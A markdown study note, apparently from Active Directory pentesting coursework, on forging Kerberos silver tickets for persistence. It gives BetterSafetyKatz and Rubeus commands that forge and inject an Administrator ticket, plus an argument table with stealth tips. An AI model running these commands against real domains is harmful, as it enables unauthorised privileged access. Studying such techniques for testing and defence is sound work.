---
tags:
  - persistence
aliases: []
cssclasses:
---
- A valid TGS
- This deals with abusing AP-REQ
- Encrypted and signed by the hash of the **service** account. 
- Services rarely check PAC (Privileged Attribute Certificate)
- Services will allow access only to the services themselves.
- Reasonable persistence period (default 30 days for computer accounts)

```batch title:"Using hash of the DC computer account, below command provides access to file system on the DC"
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:domain.name /sid:S-1-XXXXX /target:domain-controller-fqdn /service:service_name /rc4:<ntlm_hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

| Arguments                      | Description                                                                                                      |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| kerberos::golden               | Name of the module (there is no Silver module)                                                                   |
| /user:Administrator            | Username for which the TGT is generated                                                                          |
| /domain:fqdn                   | Domain FQDN                                                                                                      |
| /sid:S-1-XXXXX                 | SID of the domain                                                                                                |
| /target:domain-controller-fqdn | Target server FQDN                                                                                               |
| /service:service_name          | The SPN of the service for which the TGS is to be created                                                        |
| /aes256:aes256_key             | AES256 keys of the service account. Using AES keys makes the attack more silent                                  |
| /id:500 /groups:512            | Optional User RID (default 500) and Group (default 513 512 520 518 519)                                          |
| /ptt                           | Injects the ticket in current process - no need to save the ticket on disk                                       |
| /startoffset:0                 | Optional when the ticket is available (default 0 - right now) in minutes                                         |
| /endin:600                     | Optional ticket liifetime (default 10 years) in minutes. The default AD setting is 10 hours = 600 minutes        |
| /renewmax:10080                | Optional ticket lifetime with renewal (default is 10 years) in minutes. the default AD setting is 7 days = 10080 |

```batch title:"Forge a silver ticket"
C:\AD\Tools\Rubeus.exe silver /service:service_name/domain-controller /rc4:<ntlm_hash> /sid:S-1-XXXXX /ldap /user:Administrator /domain:domain.name /ptt
```

`/ldap` queries DC for information related to the user.

